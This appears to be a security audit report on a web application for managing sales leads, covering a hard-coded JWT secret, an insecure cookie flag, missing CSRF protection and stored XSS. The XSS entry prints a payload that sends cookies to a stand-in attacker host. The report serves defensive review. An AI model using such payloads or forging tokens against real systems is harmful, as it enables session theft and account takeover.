--- VULNERABILITY #1 -----------------------------------------------------------
CWE-798: Use of Hard-Coded Credentials
Severity: Critical
File: app/config.py
Line: 13
Description:
  The JWT secret key has a hardcoded default value:
    secret_key: str = os.getenv("SECRET_KEY", "troque-esta-chave-em-producao")
  If the SECRET_KEY environment variable is not set, the application uses the
  predictable string "troque-esta-chave-em-producao" to sign and verify all
  JWT tokens.
Exploitation:
  An attacker who knows or guesses this default secret key can forge arbitrary
  JWT tokens, impersonate any user, and gain full access to the application by
  crafting a token with any user ID in the "sub" claim.

--- VULNERABILITY #2 -----------------------------------------------------------
CWE-614: Sensitive Cookie Without 'Secure' Flag
Severity: High
File: app/routers/api_auth.py
Lines: 39-47 and 65-73
Description:
  The JWT access token cookie is set with secure=False in both the register
  and login endpoints (httponly=True, secure=False, samesite="lax"). This
  means the authentication cookie will be transmitted over unencrypted HTTP
  connections.
Exploitation:
  An attacker performing a man-in-the-middle attack (e.g., on a public Wi-Fi
  network) can intercept the cookie in transit over HTTP and hijack the user's
  session.

--- VULNERABILITY #3 -----------------------------------------------------------
CWE-352: Cross-Site Request Forgery (CSRF)
Severity: High
File: app/routers/api_auth.py, app/routers/api_leads.py
Lines: Multiple (all state-changing endpoints)
Description:
  The application uses cookie-based JWT authentication but does not implement
  any CSRF protection. There are no CSRF tokens, no custom header requirements
  for cookie-authenticated requests, and only SameSite=Lax (which provides
  partial protection). State-changing operations (POST, PUT, DELETE) on leads,
  interactions, registration, and login are all vulnerable.
Exploitation:
  An attacker can create a malicious website that causes a logged-in user's
  browser to send authenticated requests to the API. A hidden form could POST
  to /api/leads to create fake leads, or DELETE to /api/leads/{id} to remove
  existing leads.

--- VULNERABILITY #4 -----------------------------------------------------------
CWE-79: Stored XSS via Dynamic Content Rendering
Severity: High
File: app/templates/leads.html, app/templates/lead_detail.html, app/templates/dashboard.html
Lines: leads.html:99, lead_detail.html:25, lead_detail.html:56, dashboard.html:44
Description:
  Multiple templates contain empty container elements that are populated via
  JavaScript (app.js) using data from the API. If the JavaScript uses innerHTML
  or similar DOM manipulation without sanitizing user-supplied data (lead names,
  company names, interaction notes), stored XSS is possible. The server-side
  templates do not perform output encoding for client-rendered content.
Exploitation:
  An attacker could create a lead with a name like
  <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">. If
  the JavaScript renders this name using innerHTML, the malicious script
  executes in the context of any user who views the leads list or detail page,
  stealing session cookies.
